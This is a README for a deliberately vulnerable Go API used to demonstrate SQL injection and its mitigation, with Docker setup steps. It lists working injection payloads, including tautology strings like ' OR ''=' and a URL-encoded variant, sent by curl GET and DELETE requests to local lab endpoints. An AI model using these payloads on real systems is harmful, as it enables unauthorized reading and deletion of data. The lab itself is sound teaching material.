# Dummy API  
    
API written in Golang with SQL injection vulnerability and level code mitigation.

## Run Database

    docker-compose up -d
    docker-compose down
    docker-compose down -v --rmi all
    docker-compose up --build -d

    CURRENT_UID=$(id -u):$(id -g) docker-compose up (colima in Mac OS)

##

    DSN="host=localhost port=54327 user=postgres password=password dbname=sqli sslmode=disable timezone=UTC connect_timeout=5" go run ./cmd/api


## Run API with Makefile (Development environment)

    make start
    make stop
    make build
    make clean
    make restart

    go run ./cmd/api  (Actually disabled)


## Database container (With Docker)

```
docker run \
  -d \
  --name postgres_sqli_eafit \
  -e POSTGRES_HOST_AUTH_METHOD=trust \
  -e POSTGRES_USER=user \
  -e POSTGRES_PASSWORD=password \
  -e POSTGRES_DB=sqli \
  -p 54325:5432 \
  diegoall1990/sqli-pg-db
```

    docker exec -it postgres_sqli_eafit psql -U postgres -d sqli
    docker exec -it linux_postgres_sqli_eafit psql -U postgres -d sqli


## SQL injection scenario


Error based sql Injection

    https://go.dev/doc/database/sql-injection

    https://go.dev/doc/database/querying

    https://mariocarrion.com/2021/10/22/golang-software-architecture-security-databases-sql-injection-permissions.html


### Payloads

Non Compliant code

    localhost:9090/vulnerable/users?id=17' OR ''='

    curl -k localhost:9090/vulnerable/users?id=16' OR ''='

    curl -X DELETE "localhost:9090/vulnerable/users?id=16'"

    curl -X DELETE "localhost:9090/vulnerable/users?id=16'"



## FindUser with SQL Injection
GET http://localhost:8080/users?id='1'OR'1'='1' HTTP/1.1
content-type: application/json

###

## FindUser correct
GET http://localhost:8080/users/correct?id=2 HTTP/1.1
content-type: application/json

###

## DeleteUser with SQL Injection
DELETE http://localhost:8080/users?id='1'OR'1'='1' HTTP/1.1
content-type: application/json
                
                localhost:9090/vulnerable/users?id=3' OR ''='
                localhost:9090/vulnerable/users?id=17' OR ''='
curl -X DELETE "localhost:9090/vulnerable/users?id='16'OR'1'='1' NO
curl -X DELETE "localhost:9090/vulnerable/users?id=16' OR ''='

curl -X DELETE "localhost:9090/vulnerable/users?id='16'OR'1'='1'" 

###

## DeleteUser correct
DELETE http://localhost:8080/users/correct?id=5 HTTP/1.1
content-type: application/json



docker-compose down -v --rmi all


ESCAPAR UNA COMILLA SIMPLE.

EScapar comillas

Payload codificado
percent-encoding (URL encoding)
curl -X DELETE "http://localhost:9090/vulnerable/users?id=3%27%20OR%20%27%27=%27"  SI FUNCIONO
curl -X DELETE localhost:9090/vulnerable/users?id=3%27%20OR%20%27%27=%27  SI FUNCIONO

Compliant code

    localhost:9090/users?id=46' OR ''='


## API collection

You can find the API collections [here](SQL-Injection-EAFIT.postman_collection.json)



















